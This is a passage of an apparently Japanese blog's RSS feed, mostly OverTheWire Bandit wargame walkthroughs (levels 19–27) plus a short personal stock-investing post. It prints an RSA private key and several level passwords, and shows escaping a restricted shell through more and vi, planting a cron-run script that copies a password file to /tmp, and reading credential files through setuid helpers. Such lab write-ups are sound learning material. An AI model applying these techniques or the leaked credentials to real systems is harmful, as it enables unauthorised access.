tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI
2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU
i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj
6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm
pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz
JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3
JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd
1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh
ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe
euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5
/Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
-----END RSA PRIVATE KEY-----
bandit25@bandit:~$ exit

# 以下はローカルで
$ touch ~/.ssh/bandit/bandit26.private.pem
$ vim ~/.ssh/bandit/bandit26.private.pem
※ cat bandit26.sshkey の結果を貼り付ける
$ chmod 600 ~/.ssh/bandit/bandit26.private.pem
(端末のウィンドウサイズを小さくする)
$ ssh -i ~/.ssh/bandit/bandit26.private.pem -l bandit26 -p 2220 bandit.labs.overthewire.org
(moreの画面で)
v
:set shell=/bin/bash
:shell
bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと-1&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ls&lt;/code&gt;すると秘密鍵があるので、ローカルへ登録します&lt;/p&gt;
&lt;p&gt;その鍵を指定し、bandit26でログインしようとすると&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ ssh -i ~/.ssh/bandit/bandit26.private.pem -l bandit26 -p 2220 bandit.labs.overthewire.org
.
.
.
  Enjoy your stay!

  _                     _ _ _   ___   __  
 | |                   | (_) | |__ \ / /  
 | |__   __ _ _ __   __| |_| |_   ) / /_  
 | &#39;_ \ / _` | &#39;_ \ / _` | | __| / / &#39;_ \ 
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ 
Connection to bandit.labs.overthewire.org closed.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;でConnectionが切れてしまいました。&lt;/p&gt;
&lt;p&gt;・・・なるほど、ログインシェルが&lt;code&gt;/bin/bash&lt;/code&gt;じゃないのか。&lt;/p&gt;
&lt;p&gt;ログインシェルの情報は&lt;code&gt;/etc/passwd&lt;/code&gt;に記載があります。ということで、再度bandit25のユーザでログインし、&lt;code&gt;/etc/passwd&lt;/code&gt;を見に行きます。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit25@bandit:~$ cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
bandit25@bandit:~$ cat /usr/bin/showtext 
#!/bin/sh

export TERM=linux

more ~/text.txt
exit 0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;TERMという環境変数は調べてみると、どうやら端末の種類みたいです&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://x68000.q-e-d.net/~68user/unix/pickup?TERM&#34;&gt;http://x68000.q-e-d.net/~68user/unix/pickup?TERM&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;more ~/text.txt&lt;/code&gt;とあるので、bandit26でログインした時には&lt;code&gt;text.txt&lt;/code&gt;の値が表示されるようです。そして&lt;code&gt;exit 0&lt;/code&gt;で正常しているので、ログインは成功しているのですが、処理が終了します。&lt;/p&gt;
&lt;p&gt;方法としては以下の2つがありましたが、どちらも権限で書き換えられず&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;/etc/passwdを書き換えて、bandit26のログインシェルを/bin/bashにする&lt;/li&gt;
&lt;li&gt;/usr/bin/showtextのexit0を消してみる&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;詰まってしまったため、回答を見に行きました。今回参考にしたのは以下です。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://burakb.net/writeup/overthewire-bandit-level-25-level-26/&#34;&gt;https://burakb.net/writeup/overthewire-bandit-level-25-level-26/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;・・・なるほど、すごい。なぜ&lt;code&gt;cat&lt;/code&gt;ではなく&lt;code&gt;more&lt;/code&gt;でテキストを表示させているかを考える必要があったみたいです。&lt;code&gt;more&lt;/code&gt;は表示する行数が多くなった場合、ページャーになるというコマンドです。今までは端末を最大にしていたので、そのまま表示されていたのですが、端末のウィンドウサイズをとても小さくし、もう一度sshしてみるとページャーになりました。&lt;/p&gt;
&lt;p&gt;続いて&lt;code&gt;v&lt;/code&gt;を押すと&lt;code&gt;vi&lt;/code&gt;が起動されます。&lt;code&gt;vi&lt;/code&gt;上で&lt;code&gt;:set shell=/bin/bash&lt;/code&gt;、&lt;code&gt;:shell&lt;/code&gt;と打つとシェルが起動しました！&lt;/p&gt;
&lt;p&gt;まとめると、&lt;code&gt;more&lt;/code&gt;にはエディター(今回は&lt;code&gt;vi&lt;/code&gt;)を起動することができ、そのエディター経由でシェルを起動する、ということに気づくかどうかがこの問題を解く鍵でした。&lt;/p&gt;
&lt;h2 id=&#34;level-27&#34;&gt;Level 27&lt;/h2&gt;
&lt;h3 id=&#34;goal-2&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Good job getting a shell! Now hurry and grab the password for bandit27!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;シェル取ったらbandit27のパスワードを取得する&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;resolve-2&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
3ba3118a22e93127a4ed485be72ef5ea
bandit26@bandit:~$ exit
(viの画面で)
:q

# 以下はローカルで行う
$ ssh -l bandit27 -p 2220 bandit.labs.overthewire.org
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit27@bandit.labs.overthewire.org&#39;s password: 3ba3118a22e93127a4ed485be72ef5ea
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと-2&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ls&lt;/code&gt;すると&lt;code&gt;bandit27-do&lt;/code&gt;というスクリプトがあるのでそれを実行しました。スクリプトの使い方は引数なしで実行するとでます。&lt;/p&gt;
&lt;h2 id=&#34;おわりに&#34;&gt;おわりに&lt;/h2&gt;
&lt;p&gt;ブルートフォースという単語が出てきて、少しセキュリティっぽくなってきました。&lt;/p&gt;
&lt;p&gt;詰まってしまったときにはずーっと取り組み続けて、なんの成果も得られませんでした状態になりました。調べていくうちに色々わかってくるのですが、手が尽きたら諦めて、一度回答を見るというのも選択肢として入れたいです。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【OverTheWire奮闘記】Bandit: Level22〜24</title>
        <link>https://tadakun8.github.io/post/over-the-wire/bandit/level22-24/</link>
        <pubDate>Thu, 24 Jun 2021 12:30:46 +0900</pubDate>
        
        <guid>https://tadakun8.github.io/post/over-the-wire/bandit/level22-24/</guid>
        <description>&lt;h2 id=&#34;level-22&#34;&gt;Level 22&lt;/h2&gt;
&lt;h3 id=&#34;goal&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;cronでどのコマンドが動いているのかをみる&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;resolve&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;bandit21@bandit:~$ cd /etc/cron.d
cronjob_bandit15_root  cronjob_bandit17_root  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  cronjob_bandit25_root
bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;amp;&amp;gt; /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;amp;&amp;gt; /dev/null
bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh 
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 &amp;gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
bandit21@bandit:/etc/cron.d$ exit

# 以下はローカルで実行
$ ssh -l bandit22 -p 2220 bandit.labs.overthewire.org
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit22@bandit.labs.overthewire.org&#39;s password: Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;p&gt;問題文で&lt;code&gt;/etc/cron.d&lt;/code&gt;のなかにファイルがあるとのことなので、そこからファイルをたどっていきパスワードを見つけることができました。&lt;/p&gt;
&lt;h2 id=&#34;level-23&#34;&gt;Level 23&lt;/h2&gt;
&lt;h3 id=&#34;goal-1&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
NOTE: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;cronでどのコマンドが動いているのかを見る&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;resolve-1&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;bandit22@bandit:~$ cd /etc/cron.d
bandit22@bandit:/etc/cron.d$ ls
cronjob_bandit15_root  cronjob_bandit17_root  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  cronjob_bandit25_root
bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &amp;amp;&amp;gt; /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;amp;&amp;gt; /dev/null
bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d &#39; &#39; -f 1)

echo &amp;quot;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget&amp;quot;

cat /etc/bandit_pass/$myname &amp;gt; /tmp/$mytarget
bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d &#39; &#39; -f 1
8ca319486bfbbc3663ea0fbe81326349
bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
bandit22@bandit:/etc/cron.d$ exit

# 以下はローカルで実行
$ ssh -l bandit23 -p 2220 bandit.labs.overthewire.org
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit23@bandit.labs.overthewire.org&#39;s password: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと-1&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;p&gt;Level22同じようにファイルをたどっていきました。&lt;/p&gt;
&lt;h2 id=&#34;level-24&#34;&gt;Level 24&lt;/h2&gt;
&lt;h3 id=&#34;goal-2&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;cronでどのコマンドが動いているのかを見る&lt;/li&gt;
&lt;li&gt;シェルスクリプトを作ってみる&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;resolve-2&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;bandit23@bandit:~$ mkdir -p /tmp/shell
bandit23@bandit:~$ cd /tmp/shell
bandit23@bandit:/tmp/shell$ vim cat-password.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 &amp;gt; /tmp/shell/password
bandit23@bandit:/tmp/shell$ chmod +x cat-password.sh
bandit23@bandit:/tmp/shell$ touch password
bandit23@bandit:/tmp/shell$ chmod 666 password
bandit23@bandit:/tmp/shell$ cp cat-password.sh /var/spool/bandit24
(1分待つ)
bandit23@bandit:/tmp/shell$ cat password 
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
bandit23@bandit:/tmp/shell$ exit

# 以下はローカルで
$ 
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit24@bandit.labs.overthewire.org&#39;s password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと-2&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;h4 id=&#34;まずはcdとcatする&#34;&gt;まずはcdとcatする&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;cd /etc/cron.d&lt;/code&gt;、&lt;code&gt;cat cronjob_bandit24&lt;/code&gt;すると&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24 
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &amp;amp;&amp;gt; /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;amp;&amp;gt; /dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;cronで&lt;code&gt;@reboot&lt;/code&gt;は見たことなかったのですが、調べて見るとシステム起動時に一回だけ実行するときに指定するものらしいです(&lt;code&gt;man 5 crontab&lt;/code&gt;に記載がありました)&lt;/p&gt;
&lt;p&gt;&lt;code&gt;@reboot&lt;/code&gt;についてわかったので、改めて&lt;code&gt;cat&lt;/code&gt;の結果を見てみると、&lt;code&gt;/usr/bin/cronjob_bandit24.sh&lt;/code&gt;が動いているらしいので、このファイルを&lt;code&gt;cat&lt;/code&gt;します。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit23@bandit:/etc/cron.d$ cat -n /usr/bin/cronjob_bandit24.sh 
     1  #!/bin/bash
     2
     3  myname=$(whoami)
     4
     5  cd /var/spool/$myname
     6  echo &amp;quot;Executing and deleting all scripts in /var/spool/$myname:&amp;quot;
     7  for i in * .*;
     8  do
     9      if [ &amp;quot;$i&amp;quot; != &amp;quot;.&amp;quot; -a &amp;quot;$i&amp;quot; != &amp;quot;..&amp;quot; ];
    10      then
    11          echo &amp;quot;Handling $i&amp;quot;
    12          owner=&amp;quot;$(stat --format &amp;quot;%U&amp;quot; ./$i)&amp;quot;
    13          if [ &amp;quot;${owner}&amp;quot; = &amp;quot;bandit23&amp;quot; ]; then
    14              timeout -s 9 60 ./$i
    15          fi
    16          rm -f ./$i
    17      fi
    18  done
    19
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;shellを探る&#34;&gt;shellを探る&lt;/h4&gt;
&lt;p&gt;3行目の&lt;code&gt;whoami&lt;/code&gt;の結果はこのファイルを&lt;code&gt;ls -l&lt;/code&gt;すると&lt;code&gt;bandit24&lt;/code&gt;とわかりました&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit23@bandit:/etc/cron.d$ ls -l /usr/bin/cronjob_bandit24.sh 
-rwxr-x--- 1 bandit24 bandit23 376 May 14  2020 /usr/bin/cronjob_bandit24.sh
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;なので、5行目は&lt;code&gt;cd /var/spool/bandit24&lt;/code&gt;ですね。&lt;/p&gt;
&lt;p&gt;7行目の&lt;code&gt;for i in * .*;&lt;/code&gt;は&lt;code&gt;/var/spool/bandit24&lt;/code&gt;にある全てのファイルをループさせています。&lt;/p&gt;
&lt;p&gt;9行目を見ると、カレントディレクトリとその1つ前のディレクトリ以外のファイルを対象にした処理だとわかります。&lt;/p&gt;
&lt;p&gt;続いて&lt;code&gt;stat&lt;/code&gt;ですが、ファイルの属性や状態を表示するコマンドです。&lt;code&gt;ls&lt;/code&gt;との違いですが、statの方が、より細かい属性や状態を表示できると受け取りました。
&lt;code&gt;stat --format &amp;quot;%U&amp;quot; ファイル名&lt;/code&gt;でそのファイルのオーナーを表示しています。&lt;/p&gt;
&lt;p&gt;次に&lt;code&gt;timeout&lt;/code&gt;コマンドですが、制限時間を指定してコマンドを実行するコマンドです。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;timeout -s 9 60 ./$i&lt;/code&gt;の意味ですが、コマンドの実行に60秒間という制限時間をもうけて、60秒超えたら&lt;code&gt;-s 9&lt;/code&gt;、シグナルの9を送信するという意味です。シグナルの9は強制終了を意味します。&lt;/p&gt;
&lt;p&gt;つまり、コマンドが実行されて60秒経ったらそのコマンドを強制終了するということです。&lt;/p&gt;
&lt;p&gt;Goalにシェルを作る旨の文があるので、&lt;code&gt;/var/spool/bandit24&lt;/code&gt;にシェルを作ればいいのかなと当たりをつけました。&lt;/p&gt;
&lt;h4 id=&#34;shellを作る&#34;&gt;shellを作る&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;vi display-date.sh&lt;/code&gt;以下のシェルを作ってみました。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh:display-date.sh&#34; data-lang=&#34;sh:display-date.sh&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/sh
&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;
  sleep &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
  date
&lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;それで&#34;&gt;・・・それで？&lt;/h4&gt;
&lt;p&gt;shellも作って&lt;code&gt;/var/spool/bandit24&lt;/code&gt;に配置させたのですが、ここから手がつきました。結局このシェルからパスワードをどうやって手に入れるんだろうとずっと悩んでいました。&lt;/p&gt;
&lt;p&gt;ということで、諦めて回答を探しました。回答はこちらのサイトを参考にしました。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://medium.com/secttp/overthewire-bandit-level-23-424786d305bf&#34;&gt;https://medium.com/secttp/overthewire-bandit-level-23-424786d305bf&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;なるほど、どうやら&lt;code&gt;/etc/bandit_pass/&lt;/code&gt;に全てのLevelのパスワードが格納されているみたいです。&lt;/p&gt;
&lt;p&gt;そして一時ファイル置き場は&lt;code&gt;/tmp&lt;/code&gt;以下に作れば良さそうでした。&lt;/p&gt;
&lt;p&gt;なので、方針として&lt;code&gt;/tmp&lt;/code&gt;にシェルを作り、実行権限を調整し、作成したものを&lt;code&gt;cp&lt;/code&gt;で&lt;code&gt;/var/spool/bandit24&lt;/code&gt;に格納することでパスワードが取得できそうです&lt;/p&gt;
&lt;h3 id=&#34;おわり&#34;&gt;おわり&lt;/h3&gt;
&lt;p&gt;次以降にbanditを進めるに当たって、いくつか重要なものが出てきました。&lt;/p&gt;
&lt;p&gt;まとめると・・・&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/etc/bandit_pass&lt;/code&gt;に全てのLevelのパスワードが格納されている&lt;/li&gt;
&lt;li&gt;Levelによっては上記ディレクトリの中のファイルからパスワードを取得する必要がある&lt;/li&gt;
&lt;li&gt;一時ファイルの場所は&lt;code&gt;/tmp&lt;/code&gt;以下に作れる&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;今までは進めていくうちにパスワードが手に入ったものが多かったので、こういう情報は覚えておきます。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>ぼくの投資方針(仮)</title>
        <link>https://tadakun8.github.io/post/invest/policy/</link>
        <pubDate>Wed, 23 Jun 2021 23:04:20 +0900</pubDate>
        
        <guid>https://tadakun8.github.io/post/invest/policy/</guid>
        <description>&lt;h2 id=&#34;見るべき銘柄&#34;&gt;見るべき銘柄&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;amzn : Amazon&lt;/li&gt;
&lt;li&gt;msft : Microsoft&lt;/li&gt;
&lt;li&gt;appl : Apple&lt;/li&gt;
&lt;li&gt;googl : Google&lt;/li&gt;
&lt;li&gt;S&amp;amp;P500&lt;/li&gt;
&lt;li&gt;ASML : 半導体メーカー 世界の8割の半導体メーカーが顧客らしい&lt;/li&gt;
&lt;li&gt;NVDA : NVIDIA&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;投資方針&#34;&gt;投資方針&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;一度買ったらそのまま持っておく&lt;/li&gt;
&lt;li&gt;SBIチャートで 6ヶ月 / 日足 / 25日線にタッチしたら買う
&lt;ul&gt;
&lt;li&gt;25日線より下がっていて、かつお金に余裕があれば買い続ける&lt;/li&gt;
&lt;li&gt;ただし、Amazonは株価が高いのでそれ以外で行う&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;毎日21時に株価をチェック&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;投資方針の根拠&#34;&gt;投資方針の根拠&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;はじめて買ったAmazonの株が失敗することなく上がり続けている&lt;/li&gt;
&lt;li&gt;そしてそれは25日線より下で買っていた&lt;/li&gt;
&lt;li&gt;見るべき銘柄にあげたものは将来的にも上がり続けると予想しているため、25日線もしくはそれを下回れば安いと判断し買う&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;戒め&#34;&gt;戒め&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;ルール以外では&lt;strong&gt;絶対に買わない&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;例え現在が調子が良くて株が上がり続けていても冷静になり、ルールに従っているかを確認する&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;見るべき銘柄以外の銘柄について&#34;&gt;見るべき銘柄以外の銘柄について&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;投資を積極的に行なっている企業の株はチェックしたい&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>【OverTheWire奮闘記】Bandit: Level19〜21</title>
        <link>https://tadakun8.github.io/post/over-the-wire/bandit/level19-21/</link>
        <pubDate>Sun, 20 Jun 2021 15:24:42 +0900</pubDate>
        
        <guid>https://tadakun8.github.io/post/over-the-wire/bandit/level19-21/</guid>
        <description>&lt;h2 id=&#34;level-19&#34;&gt;Level 19&lt;/h2&gt;
&lt;h3 id=&#34;goal&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;The password for the next level is stored in a file readme in the homedirectory. Unfortunately, someone has modified .bashrc to log you out when you log in with SSH.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;パスワードは&lt;code&gt;readme&lt;/code&gt;ファイルにある&lt;/li&gt;
&lt;li&gt;誰かが&lt;code&gt;.bashrc&lt;/code&gt;ファイルを修正し、SSHでログインするときにログアウトするように設定している&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;resolve&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;# 以下はローカルで
$ ssh -l bandit18 -p 2220 bandit.labs.overthewire.org cat readme
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit18@bandit.labs.overthewire.org&#39;s password: 
IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
$ 
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;p&gt;ログインできないので、sshでコマンド実行ならいけるかと思い、実行してみたらいけました。半信半疑でしたが、sshでコマンド実行するだけなのでログイン扱いにはならないみたいです。&lt;/p&gt;
&lt;h2 id=&#34;level-20&#34;&gt;Level 20&lt;/h2&gt;
&lt;h3 id=&#34;goal-1&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (/etc/bandit_pass), after you have used the setuid binary.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;homeディレクトリにある&lt;code&gt;setuid&lt;/code&gt;を実行し、そのあと&lt;code&gt;/etc/bandit_pass&lt;/code&gt;からパスワードを取得する&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;resolve-1&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
bandit19@bandit:~$ exit

# 以下はローカルで
❯❯❯ ssh -l bandit20 -p 2220 bandit.labs.overthewire.org
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit20@bandit.labs.overthewire.org&#39;s password: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと-1&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ls&lt;/code&gt;してみると&lt;code&gt;bandit20 do&lt;/code&gt;というファイルがあったので、これを実行すると使い方が表示されました&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit19@bandit:~$ ./bandit20-do 
Run a command as another user.
  Example: ./bandit20-do id
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;とりあえずExampleのようにしてみます。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit19@bandit:~$ ./bandit20-do id
uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;・・・これでいいのか？と不安を覚えながら&lt;code&gt;cat&lt;/code&gt;してみると&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit19@bandit:~$ cat /etc/bandit_pass/bandit20
cat: /etc/bandit_pass/bandit20: Permission denied`
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;だめじゃん！&lt;/p&gt;
&lt;p&gt;うーんと首を傾げながら考えてみると・・・&lt;code&gt;Example: ./bandit20-do id&lt;/code&gt;の&lt;code&gt;id&lt;/code&gt;はコマンドでは？ということに気づきました。ということで、&lt;code&gt;./bandit20-do cat /etc/bandit_bass/bandit20&lt;/code&gt;でパスワードを取得できました。&lt;/p&gt;
&lt;h2 id=&#34;level-21&#34;&gt;Level 21&lt;/h2&gt;
&lt;h3 id=&#34;goal-2&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).
NOTE: Try connecting to your own network daemon to see if it works as you think&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;setuidバイナリを使用する&lt;/li&gt;
&lt;li&gt;このバイナリはポート番号を引数にとる&lt;/li&gt;
&lt;li&gt;テキストを読み取り、前のレベルのパスワードと比較し合っていたら次のパスワードを返す&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;resolve-2&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;bandit20@bandit:~$ echo &amp;quot;GbKksEFF4yrVs6il55v6gwY5aVje5f0j&amp;quot; | nc -l localhost -p 61337 &amp;amp;
[4] 2721
bandit20@bandit:~$ ./suconnect 61337
Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
Password matches, sending next password
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
[4]   Done                    echo &amp;quot;GbKksEFF4yrVs6il55v6gwY5aVje5f0j&amp;quot; | nc -l localhost -p 61337
